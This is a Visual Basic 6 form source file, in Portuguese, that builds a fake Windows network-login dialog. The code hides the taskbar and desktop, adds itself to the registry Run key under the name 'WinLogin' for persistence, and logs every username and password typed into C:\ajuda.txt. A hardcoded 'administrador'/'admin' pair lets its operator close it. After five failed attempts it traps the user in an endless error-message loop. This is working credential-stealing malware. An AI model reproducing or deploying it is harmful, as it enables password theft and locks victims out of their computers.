VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Digitar a senha da rede"
   ClientHeight    =   2550
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7500
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   DrawStyle       =   2  'Dot
   FillStyle       =   0  'Solid
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2550
   ScaleWidth      =   7500
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   WhatsThisButton =   -1  'True
   WhatsThisHelp   =   -1  'True
   Begin VB.CommandButton Command2 
      Caption         =   "Cancelar"
      Height          =   375
      Left            =   6600
      TabIndex        =   9
      Top             =   600
      Width           =   855
   End
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   375
      Left            =   6600
      TabIndex        =   8
      Top             =   120
      Width           =   855
   End
   Begin VB.TextBox Text3 
      Height          =   375
      Left            =   2880
      TabIndex        =   6
      Top             =   1800
      Width           =   3375
   End
   Begin VB.TextBox Text1 
      Height          =   375
      IMEMode         =   3  'DISABLE
      Left            =   2880
      PasswordChar    =   "*"
      TabIndex        =   5
      Top             =   1320
      Width           =   3375
   End
   Begin VB.TextBox Text2 
      Height          =   375
      Left            =   2880
      TabIndex        =   3
      Top             =   840
      Width           =   3375
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'None
      Height          =   855
      Left            =   240
      Picture         =   "Form1.frx":000C
      ScaleHeight     =   855
      ScaleWidth      =   975
      TabIndex        =   1
      Top             =   120
      Width           =   975
   End
   Begin VB.Label Label5 
      Caption         =   "&Domínio:"
      Height          =   375
      Left            =   1440
      TabIndex        =   7
      Top             =   1800
      Width           =   1455
   End
   Begin VB.Label Label4 
      Caption         =   "Sen&ha:"
      Height          =   375
      Left            =   1440
      TabIndex        =   4
      Top             =   1320
      Width           =   1455
   End
   Begin VB.Label Label3 
      Caption         =   "&Nome do usuário:"
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   840
      Width           =   1455
   End
   Begin VB.Label Label2 
      Caption         =   "   Digite sua senha de rede para a Rede Microsoft."
      Height          =   255
      Left            =   1320
      TabIndex        =   0
      Top             =   120
      Width           =   3615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim tent As Integer
Private Sub Command1_Click()
If Text2.Text = "administrador" And Text1.Text = "admin" Then
BarraTarefas True
AreaTrabalho True
End
Else
Open "C:\ajuda.txt" For Append As #1
Write #1, " Data :" & Date & "    Horario : " & Time
Write #1, " Usuario : " & Text2.Text
Write #1, " Senha : " & Text1.Text
Write #1, " Tentativa : " & Str(tent)
Write #1, ""
Close #1
tent = tent + 1
If tent = 5 Then
Do
MsgBox "Se realmente quer usar esse computador" & Chr(13) & "entre em contato com o Administrador do Sistema.", vbCritical, "Logon do Sistema"
Loop
Else
MsgBox "Acesso Negado", vbCritical, "Logon do Sistema"
Exit Sub
End If
End If
End Sub

Private Sub Form_Load()
'A linha de baixo só funciona no Win98.Se tiver usando outro sistema comente-a.
'RegisterServiceProcess GetCurrentProcessId, 1
If App.PrevInstance Then
End
End If
BarraTarefas False
AreaTrabalho False
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & "WinLogin", App.Path & "\" & App.EXEName & ".exe"
End Sub
